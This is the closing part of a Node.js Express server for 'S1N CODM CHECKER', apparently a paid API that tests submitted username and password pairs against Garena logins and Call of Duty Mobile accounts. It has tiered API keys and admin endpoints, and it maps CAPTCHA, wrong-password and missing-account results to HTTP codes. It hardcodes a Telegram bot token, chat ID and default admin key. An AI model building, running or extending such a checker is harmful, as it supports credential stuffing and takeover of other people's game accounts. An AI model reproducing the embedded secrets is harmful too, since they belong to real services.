            logging.warning(`/api/check: CODM_FAILURE for ${String(fail_user || "").substring(0,3)}... Reason: ${fail_reason}`);
            return res.status(200).json({
                status: "partial_success",
                message: "Garena login successful, CODM check failed/account not linked.",
                details: fail_reason,
                error_type: "CODM_FAILURE",
                username: fail_user
            });
        } else if (typeof result === 'string') {
            const error_message = strip_ansi_codes(result);
            logging.warning(`/api/check: Failed for ${safeUser}. Reason: ${error_message}`);
            
            let statusCode = 400;
            if (error_message.startsWith("[🤖] CAPTCHA")) statusCode = 429;
            else if (error_message.includes("INCORRECT PASSWORD")) statusCode = 401;
            else if (error_message.startsWith("[👻] ACCOUNT DOESN'T EXIST")) statusCode = 404;
            else if (error_message.includes("FORBIDDEN (403)")) statusCode = 403;
            else if (error_message.startsWith("[⏱️]") || error_message.includes("TIMEOUT")) statusCode = 504;
            else if (error_message.startsWith("[🔴]") || error_message.startsWith("[🔌]")) statusCode = 502; // Generic connection/network error
            else if (error_message.startsWith("[💥]") || error_message.startsWith("[🧩]") || error_message.startsWith("[⚠️]")) statusCode = 500;

            return res.status(statusCode).json({ status: "error", message: error_message, error_type: "CHECK_FAILED" });
        } else {
            logging.error(`/api/check: Unexpected result type for ${safeUser}. Result: ${JSON.stringify(result).substring(0,200)}`);
            return res.status(500).json({ status: "error", error: "Internal error: Unexpected result type." });
        }

    } catch (error) {
        logging.exception(`Critical error in /api/check for ${safeUser}:`, error);
        if (error.isSysExit) {
            return res.status(500).json({ status: "error", error: "Critical internal error.", details: error.message });
        }
        res.status(500).json({ status: "error", error: "Internal server error during check.", details: strip_ansi_codes(error.message) });
    }
});


// Admin Endpoints
app.post('/admin/keys/add', adminAuthMiddleware, (req, res) => {
    const { userId, tierName } = req.body;
    if (!userId || !tierName) return res.status(400).json({ error: "userId and tierName required." });
    if (!apiKeyManager.TIERS || !apiKeyManager.TIERS[tierName]) {
        return res.status(400).json({ error: `Invalid tierName. Valid: ${apiKeyManager.TIERS ? Object.keys(apiKeyManager.TIERS).join(', ') : 'N/A'}` });
    }
    try {
        const result = apiKeyManager.addApiKey(userId, tierName);
        logging.info(`Admin: Added API key for user ${userId}, tier ${tierName}. Key: ${result.apiKey.substring(0,5)}...`);
        res.status(201).json(result);
    } catch (e) {
        logging.exception("Admin: Error adding API key:", e);
        res.status(500).json({error: "Failed to add API key.", details: e.message});
    }
});

app.post('/admin/keys/remove', adminAuthMiddleware, (req, res) => {
    const { apiKey } = req.body;
    if (!apiKey) return res.status(400).json({ error: "apiKey required." });
    try {
        const result = apiKeyManager.removeApiKey(apiKey);
        if (result.error) return res.status(404).json(result);
        logging.info(`Admin: Removed API key ${apiKey.substring(0,5)}...`);
        res.status(200).json(result);
    } catch (e) {
        logging.exception("Admin: Error removing API key:", e);
        res.status(500).json({error: "Failed to remove API key.", details: e.message});
    }
});

app.get('/admin/keys/info/:apiKey', adminAuthMiddleware, (req, res) => {
    const { apiKey } = req.params;
    try {
        const result = apiKeyManager.getApiKeyInfo(apiKey);
        if (result.error) return res.status(404).json(result);
        logging.info(`Admin: Queried info for API key ${apiKey.substring(0,5)}...`);
        res.status(200).json(result);
    } catch (e) {
        logging.exception("Admin: Error getting API key info:", e);
        res.status(500).json({error: "Failed to get API key info.", details: e.message});
    }
});

app.get('/admin/keys/user/:userId', adminAuthMiddleware, (req, res) => {
    const { userId } = req.params;
    try {
        const result = apiKeyManager.findApiKeysByUserId(userId);
        if (result.error) return res.status(404).json(result);
        logging.info(`Admin: Queried keys for user ID ${userId}. Found: ${Array.isArray(result.keys) ? result.keys.length : 0}`);
        res.status(200).json(result);
    } catch (e) {
        logging.exception("Admin: Error finding keys by user ID:", e);
        res.status(500).json({error: "Failed to find keys by user ID.", details: e.message});
    }
});

app.get('/admin/keys/all', adminAuthMiddleware, (req, res) => {
    try {
        const allKeysData = apiKeyManager.getAllKeys();
        const overview = Object.values(allKeysData).map(k => ({
            apiKey: k.apiKey ? `${k.apiKey.substring(0,5)}...${k.apiKey.slice(-3)}` : 'N/A',
            userId: k.userId, tierName: k.tierName, checksMade: k.checksMade,
            checkLimit: k.checkLimit,
            validUntil: k.validUntil ? DateTime.fromISO(k.validUntil).toFormat("yyyy-LL-dd HH:mm ZZZZ") : "N/A",
            createdAt: k.createdAt ? DateTime.fromISO(k.createdAt).toFormat("yyyy-LL-dd HH:mm ZZZZ") : "N/A",
            lastReset: k.lastReset ? DateTime.fromISO(k.lastReset).toFormat("yyyy-LL-dd HH:mm ZZZZ") : "N/A",
        }));
        logging.info(`Admin: Queried all keys. Total: ${overview.length}`);
        res.status(200).json({ keys_overview: overview, total_keys: overview.length });
    } catch (e) {
        logging.exception("Admin: Error getting all API keys:", e);
        res.status(500).json({error: "Failed to get all API keys.", details: e.message});
    }
});


// Global error handler
app.use((err, req, res, next) => {
    logging.exception("Unhandled Express error:", err);
    if (err.isSysExit) {
        return res.status(500).json({ error: "Critical internal process error.", details: err.message, code: err.exitCode });
    }
    res.status(err.status || 500).json({ 
        error: "Internal Server Error", 
        details: strip_ansi_codes(err.message)
    });
});

function displayStartupBanner() {
    const banner = `
${COLORS['CYAN']}
  ⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  ⠀⣀⣀⣀⠔⡪⣵⣮⣽⡿⢿⣿⣿⡿⢐⡠⢀⠀⠀⠀⠀⠀⠀
  ⢁⡠⢒⣼⡿⠿⠓⠉⠀⠀⠀⠙⢏⣔⠉⠈⣷⣷⣆⠀⠀⠀⠀
  ⠀⣰⢿⠋⠀⣴⣦⣦⣄⡀⠀⠀⠀⠙⢶⣿⣿⠟⢹⡷⡀⠀⠀
  ⡞⣴⠃⠀⠀⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠉⠻⡴⠋⣠⢿⡀⠀
  ⢡⣯⡤⡀⠀⠘⠿⣿⣷⣿⠟⠁⠀⠀⠀⠀⠀⠈⠺⢧⡄⣧⠀
  ⡾⠀⢹⣿⠀⠀⠀⠀⠀⠀⠀⠀⣴⣾⣶⣄⠀⠀⠀⠀⢹⡟⡆
  ⠁⢰⣿⡟⢄⠀⠀⣴⣿⣿⠀⠘⣿⣯⣿⣿⣷⡀⠀⢠⣿⡇⠇
  ⠀⠈⢃⡵⢍⠦⣄⠀⠚⠃⠀⠀⠹⣿⣿⣯⣿⡇⠠⢻⣿⡽⠀
  ⠀⠀⠀⠉⢁⡕⢍⡱⢢⡀⠀⣀⡀⠈⠉⠉⠉⢀⣴⡟⢹⡄⠀
  ⡄⠀⠀⠀⠀⢀⡺⠨⠳⣼⣿⠟⠻⣗⠄⢀⣴⡿⠋⡰⢃⡇⠀
  ⣿⣷⣄⣀⡀⢚⣿⣶⣄⡉⠁⣠⣶⣾⣿⣿⣋⠔⠋⢠⠜⠀⠀
${COLORS['YELLOW']} S1N CODM CHECKER: API VERSION${COLORS['BOLD']}${COLORS['RESET']}
`;
    console.log(banner);
}


async function main_api_start() {
    const log_dir_name = "logs";
    const log_dir = path.resolve(__dirname, log_dir_name);
    fsExtra.ensureDirSync(log_dir);

    const log_file_name = `checker_api_run_${get_current_timestamp()}.log`;
    const log_file_path = path.join(log_dir, log_file_name);
    
    logging.basicConfig({
        level: logging.INFO,
        handlers: [new logging.FileHandler(log_file_path, 'utf-8')],
    });
    
    logging.info(`--- API SCRIPT STARTED (PID: ${process.pid}) ---`);
    logging.info(`Node.js: ${process.version}, Platform: ${platform.system()} (${platform.release()})`);
    logging.info(`Log Level: ${logging.getLevelName(logging.getLogger().level)}`);
    console.log(`${COLORS['GREY']}Logging to: ${log_file_path}${COLORS['RESET']}`);

    app.listen(PORT, '0.0.0.0', () => {
        displayStartupBanner();
        console.log(`${COLORS['GREEN']}S1N CODM CHECKER API listening on PORT ${PORT}${COLORS['RESET']}`);
        console.log(`${COLORS['YELLOW']}API Endpoint: http://localhost:${PORT}/api/check (GET/POST)${COLORS['RESET']}`);
        console.log(`${COLORS['CYAN']}  Required params: apikey, user, password.`);
        // console.log(`${COLORS['CYAN']}  Optional param: proxy (full proxy URL string).`); // Proxy removed
        console.log(`${COLORS['YELLOW']}Admin API Endpoints (require 'x-admin-key' header):${COLORS['RESET']}`);
        console.log(`  ${COLORS['BOLD']}POST${COLORS['RESET']}   /admin/keys/add          Body: { "userId": "string", "tierName": "string" }`);
        console.log(`  ${COLORS['BOLD']}POST${COLORS['RESET']}   /admin/keys/remove       Body: { "apiKey": "string" }`);
        console.log(`  ${COLORS['BOLD']}GET${COLORS['RESET']}    /admin/keys/info/:apiKey`);
        console.log(`  ${COLORS['BOLD']}GET${COLORS['RESET']}    /admin/keys/user/:userId`);
        console.log(`  ${COLORS['BOLD']}GET${COLORS['RESET']}    /admin/keys/all`);


        if (ADMIN_MASTER_KEY === "sinluna") {
            console.warn(`${COLORS['RED_BG']}WARNING: Default ADMIN_MASTER_KEY 'sinluna' used. Set ADMIN_MASTER_KEY env var.${COLORS['RESET']}`);
        }
        if (TELEGRAM_BOT_TOKEN === "7671609285:AAFYtH0qVuRWWoJTI8gcCriFEAVu11eMayo" || TELEGRAM_CHAT_ID === "6542321044") {
            logging.warning("Default/Placeholder Telegram token/chat ID. Telegram notifications might not work.");
        }
    });
}

if (require.main === module) { 
    main_api_start().catch(err => {
        const clean_error_msg = strip_ansi_codes(String(err.message || err));
        console.error(`${COLORS['RED_BG']}${COLORS['WHITE']} 💥 CRITICAL STARTUP ERROR: ${htmlEscape(clean_error_msg)} ${COLORS['RESET']}`);
        if (logging && typeof logging.critical === 'function') {
            logging.critical("CRITICAL STARTUP ERROR", err);
        }
        process.exit(1);
    });
}

function gracefulShutdown(signal) {
    console.log(`\n${COLORS['RED']}🛑 Received ${signal}. Shutting down...${COLORS['RESET']}`);
    logging.warning(`Received ${signal}. Shutting down.`);
    setTimeout(() => {
        logging.error("Graceful shutdown timed out. Forcing exit.");
        process.exit(1);
    }, 5000);
    process.exit(0);
}

process.on('SIGINT', () => gracefulShutdown('SIGINT'));
process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));

process.on('exit', (code) => {
    if (logging && typeof logging.info === 'function') {
        logging.info(`--- SCRIPT FINISHED (CODE ${code}) ---`);
    }
    console.log(Style.RESET_ALL);
});

process.on('unhandledRejection', (reason, promise) => {
    if (logging && typeof logging.critical === 'function') {
        logging.critical('Unhandled Rejection:', promise, 'reason:', reason);
    } else {
        console.error('Unhandled Rejection:', promise, 'reason:', reason);
    }
});

process.on('uncaughtException', (error) => {
    if (logging && typeof logging.critical === 'function') {
        logging.critical('Uncaught Exception:', error);
    } else {
        console.error('Uncaught Exception:', error);
    }
    process.exit(1);
});
